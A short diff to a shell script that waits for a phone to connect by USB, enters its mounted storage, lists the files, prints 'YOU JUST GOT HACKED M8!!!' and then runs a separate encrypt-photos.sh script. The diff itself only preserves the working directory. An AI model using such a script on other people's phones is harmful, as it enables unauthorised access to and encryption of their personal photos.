@@ -2,6 +2,7 @@
 #This script waits for a phone connection and then accesses its data.
 #TODO make script detect phone and not just any USB device
 
+LOCALPATH=$(pwd)
 usbcount=$(lsusb | wc -l) 
 newcount=$usbcount
 #wait until phone is connected (not mounted)
@@ -24,5 +25,6 @@ cd /run/user/$UID/gvfs/mtp*/*
 ls
 echo 'YOU JUST GOT HACKED M8!!!'
 
+cd "$LOCALPATH"
 ./encrypt-photos.sh
 
